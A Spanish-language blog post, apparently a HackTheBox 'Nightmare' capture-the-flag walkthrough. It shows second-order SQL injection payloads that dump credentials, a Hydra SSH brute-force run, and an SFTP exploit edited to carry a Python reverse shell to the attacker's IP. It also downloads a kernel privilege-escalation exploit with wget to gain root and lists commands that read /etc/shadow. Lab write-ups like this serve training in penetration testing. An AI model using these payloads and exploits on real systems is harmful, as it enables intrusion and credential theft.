---
layout: post
title: "Como hackear un sitio web con una inyeccion SQL de segundo orden"
description: "Aprende pentesting web desde 0 con HackTheBox (Nightmare)."
date: 2019-08-18
image: "img/sql-injec.jpg"
tags: ["Inyeccion SQL", "Inyeccion XSS", "Vulnerando SFTP", "Fuerza Bruta"]
---

Hello Hackers!!  
En el dia de hoy, vamos a realizar una prueba de penetracion hacia un servidor vulnerable a inyecciones SQL de segundo orden, Si deseas practicar realizando las diferentes actividades que voy a presentar durante este tutorial, te invito a revisar la maquina [Nightmare](https://www.hackthebox.eu/home/machines/profile/137) de HackTheBox.  

Antes de comenzar, quiero aclarar que todo mi contenido publicado se realiza con fines educativos, informativos y éticos.  
No soy responsable del mal uso que puedan darte.  

# Con este tutorial aprenderas el siguiente contenido:  
   - Como realizar un escaneo de puertos con Nmap  
   - Como realizar un descubrimiento de directorios sobre un servidor web  
   - Como realizar una inyeccion SQL de segundo orden sobre un servidor web  
   - Como robar una cookie de sesion administrativa con una inyeccion XSS  
   - Como realizar un analisis de ejecutables con **strings**  
   - Como realizar una busqueda de informacion util para escalar privilegios  
   - Como manipular un exploit para obtener una ejecucion exitosa  

# Hackeando a [Nightmare](https://www.hackthebox.eu/home/machines/profile/137)  

En cualquier proceso para piratear o tener control total sobre un servidor de manera no autorizada, se debe comenzar con una enumeración del sistema.  
Para ello realizaremos un simple escaneo con Nmap, de la siguiente manera.  

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # nmap -sC -sV 10.10.10.66
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-25 11:47 -05
Nmap scan report for 10.10.10.72 (10.10.10.72)
Host is up (0.19s latency).
PORT     STATE SERVICE VERSION 
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)) 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-title: NOTES 
2222/tcp open  ssh     (protocol 2.0) 
| fingerprint-strings:  
|   NULL:  
|_    SSH-2.0-OpenSSH 32bit (not so recent ver) 
| ssh-hostkey:  
|   1024 e2:71:84:5d:ed:07:89:98:68:8b:6e:78:da:84:4c:b5 (DSA) 
|   2048 bd:1c:11:9a:5b:15:d2:f6:28:76:c3:40:7c:80:6d:ec (RSA) 
|_  256 bf:e8:25:bf:ca:92:55:bc:ca:a4:96:c7:43:d0:51:73 (ECDSA)
{% endhighlight %}

Con los resultados del escaneo anterior de Nmap, logramos identificar varios servicios interesantes corriendo en el servidor victima; entre ellos esta el puerto 80 (HTTP) y el 2222 (SSH).    
Cuando visitamos la página web que esta corriendo en el puerto 80, encontramos una página de inicio de sesión.  

<figure>
  <img src="{{site.baseurl}}/img/WebPage80.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/WebPage80.png" title="Pagina web encontrada en el puerto 80">Pagina web encontrada en el puerto 80</a>.
  </figcaption>
</figure>

## Inyectando codigo SQL en un aplicativo web

Después de probar algunos comandos de inyección SQL, encontramos que esta página es vulnerable a la "inyección SQL de segundo orden". Esto significa que para aprovechar esta vulnerabilidad, tenemos que registrar a un usuario con nuestra consulta de inyección SQL y luego iniciar sesión con el mismo nombre de usuario, para finalmente ver las salidas de las consultas realizadas.  
A continuacion, muestro como detectar un formulario vulnerable a una inyeccion SQL de segundo orden usando la comilla típica.  

<figure>
  <img src="{{site.baseurl}}/img/SQL-ErrorNightmare.gif">
	<figcaption>
    <a href="{{site.baseurl}}/img/SQL-ErrorNightmare.gif" title="Detectando un formulario vulnerable a inyecciones SQL">Detectando un formulario vulnerable a inyecciones SQL</a>.
  </figcaption>
</figure>

El primer paso para poder empezar a realizar consultas a la base de datos por medio de este formulario vulnerable, es identificar el número de campos con **order by**.

{% highlight sql %}
Sephiroth')order by 2#
{% endhighlight %}

Cuando iniciamos sesión con la carga util anterior, encontramos que no tenemos un error de SQL lo que significa que la tabla tiene 2 columnas.

<figure>
  <img src="{{site.baseurl}}/img/SQL-ErrorNightmare2.gif">
	<figcaption>
    <a href="{{site.baseurl}}/img/SQL-ErrorNightmare2.gif" title="Detectando un formulario vulnerable a inyecciones SQL">Detectando un formulario vulnerable a inyecciones SQL</a>.
  </figcaption>
</figure>

Luego de identificar el numero de campos, podemos empezar a enumerar la base de datos.  
Las siguientes cargas utiles nos ayudaron a encontrar una tabla con credenciales.  

{% highlight sql %}
-- Sephiroth')union select all 1,@@version#
SELECT @@version
--Version actual corriendo en el motor de base de datos

--Sephiroth')union select all 1,database()#
SELECT database()
--Nombre de la base de datos actual

-- Sephiroth')union select all 1,table_schema from information_schema.tables#
SELECT table_schema, table_name FROM INFORMATION_SCHEMA.tables
-- Listando todas las base de datos

-- Sephiroth')union select all 1,table_name from information_schema.tables where table_schema='sysadmin'#
SELECT table_name FROM information_schema.tables where table_schema='sysadmin'
-- Seleccionando la base de datos "sysadmin" y recuperar las tablas que contiene

-- Sephiroth')union select all 1,column_name from information_schema.columns where table_name='users'#
SELECT column_name FROM information_schema.columns where table_name='users'
-- Visualizando las columnas que tiene la tabla Users de la base de datos "sysadmin"

-- Sephiroth')union select 1,(select group_concat(username,0x7c,password) from sysadmin.users)#
SELECT group_concat(username,0x7c,password) FROM sysadmin.users
-- Visualizando el contenido de la tabla users con todas sus columnas separadas con el caracter |
{% endhighlight %}

Cabe resaltar, que el aplicativo web cuenta con una validacion de JS que no permite el ingreso de muchos caracteres en los campos de inicio de sesion.  
Para burlar dicha validacion podriamos hacer uso de BurpSuite.  

<figure>
  <img src="{{site.baseurl}}/img/SQL-CredsNightmare.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/SQL-CredsNightmare.png" title="Obteniendo credenciales de la tabla usuarios">Obteniendo credenciales de la tabla usuarios</a>
  </figcaption>
</figure>


## Realizando un forzado de inicio de sesion en SSH con HYDRA     
Gracias a la informacion obtenida con las inyecciones SQL, tenemos una tabla de usuarios con sus posibles correspondientes contraseñas.  
El paso siguiente es organizar un diccionario con la informacion recopilada y realizar un ataque de fuerza bruta con HYDRA para iniciar sesion sobre el servicio de SSH.  
**Ataque de fuerza bruta**, es el proceso donde se intenta obtener acceso no autorizado a un sistema o software protegido por una contraseña. En otras palabras es obtener la contraseña correcta que le da acceso a un sistema protegido por un método de autenticación.  
[Articulo Completo](https://hackingprofessional.github.io/Security/Cracking-de-passwords/)  
Vamos a crear dos archivo de texto, en el primero alojamos todos los usuarios y en el segundo todas las credenciales:  
El archivo de **usuarios.txt** debe tener el siguiente contenido:  
{% highlight markdown %}
admin
cisco
adminstrator
josh
system
root
decoder
ftpuser
sys
superuser
user
{% endhighlight %}

El archivo de **passwords.txt** debe tener el siguiente contenido:  
{% highlight markdown %}
nimda
cisco123
Pyuhs738?183*hjO!
tontochilegge
manager
HasdruBal78
HackerNumberOne!
@whereyougo?
change_on_install
passw0rd
odiolafeta
{% endhighlight %}

Ahora usando Hydra vamos a realizar un ataque de diccionario al servicio de "SSH", para ello debemos importar los dos archivos recien creados con los parametros "L" y "P" .  
  
{% highlight zsh %}
┌─[root@Horus] - [/Prometheus/Ethic4l-Hacking/Operations/Premium/Nightmare/creds-all] - [lun sep 09, 03:59]
└─[$]> hydra -L usuarios.txt -P passwords.txt -t 4 10.10.10.66 ssh -s 2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-09 04:00:16
[DATA] max 4 tasks per 1 server, overall 4 tasks, 121 login tries (l:11/p:11), ~31 tries per task
[DATA] attacking ssh://10.10.10.66:2222/
[2222][ssh] host: 10.10.10.66   login: ftpuser   password: @whereyougo?
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-09 04:00:42
{% endhighlight %}

Listo, hemos obtenido las credenciales de acceso: **ftpuser:@whereyougo?**.
Al intentar iniciar sesion en el servicio de SSH obtenemos lo siguiente:  

{% highlight zsh %}

┌─[root@Horus] - [/Prometheus/Ethic4l-Hacking/Operations/Premium/Nightmare/creds-all] - [lun sep 09, 04:00]
└─[$]> ssh ftpuser@10.10.10.66 -p 2222
The authenticity of host '[10.10.10.66]:2222 ([10.10.10.66]:2222)' can't be established.
ECDSA key fingerprint is SHA256:vraE0Jcr+Ej82gpS418pu9aYthWijx0FOjKWC9fthiU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.66]:2222' (ECDSA) to the list of known hosts.
ftpuser@10.10.10.66's password: 
PTY allocation request failed on channel 0

{% endhighlight %}

Por el nombre del usuario y al ver que no pudimos obtener una shell luego de iniciar con SSH, intentemos iniciar sesion con SFTP. 

**SFTP**, (SSH File Transfer Protocol) es un protocolo seguro de transferencia de archivos. Se ejecuta sobre el protocolo SSH . Es compatible con la funcionalidad completa de seguridad y autenticación de SSH.  
[Articulo Completo](https://www.ssh.com/ssh/sftp/)

{% highlight zsh %}
┌─[root@Horus] - [/datos/gerh/Escritorio/Prometheus/Ethic4l-Hacking/Operations/Premium/Nightmare/creds-all] - [lun sep 09, 04:10]
└─[$]> sftp -P 2222 ftpuser@10.10.10.66
ftpuser@10.10.10.66's password: 
Connected to ftpuser@10.10.10.66.
sftp> ls
bin             boot            dev             etc             home            initrd.img      initrd.img.old  lib             lib32           lib64           libx32          lost+found      
media           mnt             opt             proc            root            run             sbin            srv             sys             tmp             usr             var             
vmlinuz         vmlinuz.old

{% endhighlight %}

## Explotando el servicio de SFTP  
Una buena practica durante un pentesting es realizar busqueda de exploits relacionados a algun servicio o aplicativo que se encuentre corriendo en la victima.  
Buscando vulnerabilidades sobre un servicio en Google.  

<figure>
  <img src="{{site.baseurl}}/img/GoogleSearchExploit.png">
	<figcaption>
    <a href="{{site.baseurl}}/img/GoogleSearchExploit.png" title="Busqueda de vulnerabilidades con Google">Busqueda de vulnerabilidades con Google</a>.
  </figcaption>
</figure>

Entre los resultados logramos identificar, que hay un exploit para SFTP.  

## OpenSSH <= 6.6 SFTP mal configurado configuración universal  
OpenSSH le permite otorgar acceso SFTP a los usuarios sin permitir la ejecución completa de comandos usando "ForceCommand internal-sftp". Sin embargo, si no configura correctamente el servidor y no utiliza ChrootDirectory, el usuario podrá acceder a todas las partes del sistema de archivos a las que tiene acceso, incluidos procfs.  
Vamos a realizar una busqueda de este exploit usando la herramienta **Searchesploit**.  
Para instalar searchsploit se debe ejecutar el siguiente comando:  

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # apt-get install searchsploit
{% endhighlight %}

Para realizar una busqueda con esta herramienta se debe ejecutar lo siguiente:  

{% highlight zsh %}
# Formato de uso: searchsploit Servicio o aplicativo buscado
# A continuacion, un ejemplo para buscar un exploit para SFTP.
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # searchsploit sftp command execution
------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                               |  Path
                                                                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------- ----------------------------------------
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                 | exploits/linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                       | exploits/linux/remote/45001.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                       | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

Vamos a copiarlo en nuestra carpeta y modificar su contenido para obtener RCE sobre nuestra victima.  

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # cp /usr/share/exploitdb/exploits/linux/remote/45001.py ./Exploit-SFTP.py 
{% endhighlight %}

## Obteniendo ejecuccion de codigo remoto por medio de un exploit

Editamos el siguiente fragmento del exploit para su funcionamiento correcto:  

{% highlight python %}
cmd = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.8",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
host = '10.10.10.66'
port = 2222
username = 'ftpuser'
password = '@whereyougo?'
{% endhighlight %}

Nos ponemos a escuchar en el puerto 443, el cual fue indicado previamente en la shell reversa con python.  

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # nc -nvlp 443
{% endhighlight %}

Para evitar cualquier error con relacion a la libreira "pown", se debe instalar con el comando **pip install pwn**.  
Sabiendo esto vamos a proceder con la ejecuccion de nuestro exploit.  

{% highlight zsh %}
┌─[root@Horus] - [/Prometheus/Ethic4l-Hacking/Operations/Premium/Nightmare] - [lun sep 09, 04:19]
└─[$]> python sftp-exploit.py 
[*] Analysing /proc/self/maps on remote system
[+] 32bit libc mapped @ f757a000-f772a000, path: /lib/i386-linux-gnu/libc-2.23.so
[+] Stack mapped @ ff803000-ff824000
[+] Fetching libc from remote system..

[*] '/datos/gerh/Escritorio/Prometheus/Ethic4l-Hacking/Operations/Premium/Nightmare/libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

[+] system()  @ 0xf75b4da0
[+] 'ret' @ 0xf757a417
[+] We have r/w permissions for /proc/self/mem! All Good.
[*] Patching /proc/self/mem on the remote system
[+] Pushing new stack to 0xff803000.. fingers crossed ;))

{% endhighlight %}

Luego de lo anterior, logramos obtener una shell por netcat por el puerto 443.  

{% highlight zsh %}
┌─[root@Horus] - [/Prometheus/Ethic4l-Hacking/Operations/Premium/Nightmare] - [lun sep 09, 04:15]
└─[$]> nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.66] 53890
/bin/sh: 0: can't access tty; job control turned off
$ 
{% endhighlight %}

## Como liberarse de una shell no interactiva
Generando una shell TTY con python.  

{% highlight python %}
python -c "import pty; pty.spawn('/bin/bash')"
{% endhighlight %}

## Escalacion de privilegios en Linux
A continuacion, dejo una recopilacion de comandos utiles para enumerar un sistema y escalar privilegios.  

{% highlight markdown %}
Lectura de Archivos sensibles
cat /etc/passwd
cat /etc/group
cat /etc/shadow
Servicios ejecutando con privilegios de root?
ps aux | grep root 
Que usuario tienes actualmente
id 
whoami
Quién ha iniciado sesión 
w
Quién más tiene una sesion iniciada 
last
Lectura de permisos
cat /etc/sudoers
sudo -l
cat /etc/passwd | cut -d: -f1    # Listado de usuarios
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # Listado de super usuarios
awk -F: '($3 == "0") {print}' /etc/passwd   # Listado de Super usuarios
{% endhighlight %}

Entre toda la variedad de comandos que podemos ejecutar, para esta demostracion el mas util fue el siguiente:  

{% highlight bash %}
# Buscando ficheros del grupo Decoder
ftpuser@nightmare:/$ find / -group decoder 2>/dev/null
find / -group decoder 2>/dev/null
/home/decoder
/home/decoder/.bashrc
/home/decoder/.profile
/home/decoder/user.txt
/home/decoder/test
/home/decoder/.bash_logout
/usr/bin/sls
{% endhighlight %}


## Analisis de ejecutable con Strings
Vamos a realizar un analisis estatico al binario no tan usual llamado sls.
Para enumerar o analizar algun binario podemos usar la herramienta **strings**.  
Como resultado obtenemos que este es un archivo ejecutable ELF.  

{% highlight bash %}
ftpuser@nightmare:/$ strings /usr/bin/sls
strings /usr/bin/sls
/lib64/ld-linux-x86-64.so.2
libc.so.6
# El ejecutable utiliza la función del sistema y el comando ls.
/bin/ls
# Después de ejecutar, vemos que funciona como el comando ls , pero filtra algunos de los caracteres.
<-uM
<bu+
AWAVA
AUATL
[]A\A]A^A_
|`&><'"\[]{};
;*3$"
{% endhighlight %}

Para poder obtener la ejecución de comandos debemos evitar los filtros anteriores.  
Podríamos hacer esto usando caracteres de escape al estilo del lenguaje C.

{% highlight bash %}
ftpuser@nightmare:/$ cd /usr/bin
cd /usr/bin
ftpuser@nightmare:/usr/bin$ sls -la /home/decoder
sls -la /home/decoder
total 28
drwxr-xr-x  3 root    decoder 4096 Sep 28  2017 .
drwxr-xr-x  3 root    root    4096 Sep 30  2017 ..
-rw-------  1 root    root       0 Sep 13  2017 .bash_history
-rw-r-----  1 decoder decoder  220 Sep  1  2015 .bash_logout
-rw-r-----  1 decoder decoder 3771 Sep  1  2015 .bashrc
-rw-r-----  1 decoder decoder  675 Sep  1  2015 .profile
drwx-wx--x  2 root    decoder 4096 Oct  2  2017 test
-r--r-----+ 1 decoder decoder   33 Sep 12  2017 user.txt
ftpuser@nightmare:/usr/bin$ sls -b '/home/decoder
sls -b '/home/decoder
> id
id
> '
'
test  user.txt
uid=1002(ftpuser) gid=1002(ftpuser) egid=1001(decoder) groups=1001(decoder),1002(ftpuser)
> bash -p'
bash -p'
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
bash-4.3$ 
{% endhighlight %}

Listo, ahora tenemos control sobre el usuario **decoder**.  
Con en el siguiente comando podremos averiguar que version y sistema operativo esta corriendo.  

{% highlight bash %}
bash-4.3$ uname -a
uname -a
Linux nightmare 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

## Escalacion de privilegios
### Busqueda de exploits con searchsploit

Si hacemos uso de la herramienta searchsploit, logramos identificar que la versión del kernel es vulnerable a esta [vulnerabilidad](https://www.exploit-db.com/exploits/43418/).

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # searchsploit Linux kernel 4.8
------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                               |  Path
                                                                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------- ----------------------------------------
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpa | exploits/linux/local/9545.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                   | exploits/linux/local/41995.c
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                   | exploits/linux/dos/45919.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                   | exploits/linux/local/41886.c
Linux Kernel 4.8.0-22/3.10.0-327 (Ubuntu 16.10 / RedHat) - 'keyctl' Null Pointer Dereference                 | exploits/linux/dos/40762.c
Linux Kernel 4.8.0-41-generic (Ubuntu) - Packet Socket Privilege Escalation                                  | exploits/linux/local/41994.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)        | exploits/linux/local/43418.c
------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

### Modificacion de un exploit desarrollado en C

Debemos eliminar o comentar los fragmentos de codigo que no correspondan al nucleo de nuestra maquina  controlada, el cual fue obtenido con el comando **uname -a**.  

{% highlight c %}
//modificamos el struct y dejamos solo la versión que nos interesa
//[...]
struct kernel_info kernels[] = {
{ "xenial", "4.8.0-58-generic", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },
};
//[...]
//modificamos la función detect_versions() :
void detect_versions() {
    char codename[DISTRO_CODENAME_LENGTH];
    char version[KERNEL_VERSION_LENGTH];
 
    get_distro_codename(&codename[0], DISTRO_CODENAME_LENGTH);
    get_kernel_version(&version[0], KERNEL_VERSION_LENGTH);
 
    int i;
    for (i = 0; i < ARRAY_SIZE(kernels); i++) {
        if (strcmp(&codename[0], kernels[i].distro) == 0 &&
            strcmp(&version[0], kernels[i].version) == 0) {
            printf("[.] kernel version '%s' detected\n", kernels[i].version);
            kernel = i;
            return;
        }
    }
    kernel = 0;
    return;
}
//[...]
{% endhighlight %}

Compilamos el codigo localmente y enviamos nuestro exploit a la maquina victima.  

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # gcc 43418.c -o MalwareEscPriv
{% endhighlight %}

## Creando un servidor HTTP para alojar nuestro malware
Ejecutamos el siguiente comando para levantar un servidor HTTP para exponer nuestro malware y posteriormente descargarlo en la maquina victima.  

{% highlight zsh %}
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # ls -la
total 1,9M
drwxr-xr-x  2 gerh root 4,0K may 26 02:30 .
drwxr-xr-x 28 gerh root 4,0K may 26 02:30 ..
-rw-r--r--  1 gerh root  212 may 24 12:16 creds
-rw-r--r--  1 gerh root 7,7K may 24 12:37 nmap-Nightmare.xml
-rwxr-xr-x  1 root root  24K jun 15 05:45 MalwareEscPriv
-rw-r--r--  1 gerh root 1,9K may 24 12:37 nmap-scan.txt
-rw-r--r--  1 gerh root 3,8K may 24 12:52 sftp-exploit.py
┌─[root@Kratos] - [/Ethic4l-Hacking/Operations/Premium/Nightmare] - [Thu Apr 25, 11:47]
└─[$]> # python3 -m http.server -p 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
{% endhighlight %}

Descargamos nuestro exploit con el binario WGET.  

{% highlight zsh %}
bash-4.3$ wget http://10.10.14.28/MalwareEscPriv
wget http://10.10.14.28/MalwareEscPriv
--2019-09-09 11:48:48--  http://10.10.14.28/MalwareEscPriv
Connecting to 10.10.14.28:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23664 (23K) [application/octet-stream]
Saving to: 'MalwareEscPriv'

MalwareEscPriv      100%[===================>]  23.11K   101KB/s    in 0.2s    

2019-09-09 11:48:48 (101 KB/s) - 'MalwareEscPriv' saved [23664/23664]
{% endhighlight %}

Luego de descargar nuestro exploit, le asignamos permiso de ejecuccion y procedemos con iniciarlo.  

{% highlight bash %}
bash-4.3$ chmod +x MalwareEscPriv
chmod +x MalwareEscPriv
{% endhighlight %}

Al ejecutarlo desde el grupo decoder no funciona, pero al probar desde ftuser conseguimos el usuario con maximos privilegios (root):  

{% highlight bash %}
ftpuser@nightmare:/home/decoder/test$ ./MalwareEscPriv
./MalwareEscPriv
[.] starting
[.] checking distro and kernel versions
[~] done, versions looks good
[.] checking SMEP and SMAP
[~] done, looks good
[.] setting up namespace sandbox
[~] done, namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[~] done, kernel text:   ffffffffa8c00000
[.] commit_creds:        ffffffffa8ca5d20
[.] prepare_kernel_cred: ffffffffa8ca6110
[.] SMEP bypass enabled, mmapping fake stack
[~] done, fake stack mmapped
[.] executing payload ffffffffa8c17c55
[~] done, should be root now
[.] checking if we got root
[+] got r00t ^_^
root@nightmare:/home/decoder/test# whoami
whoami
root
{% endhighlight %}
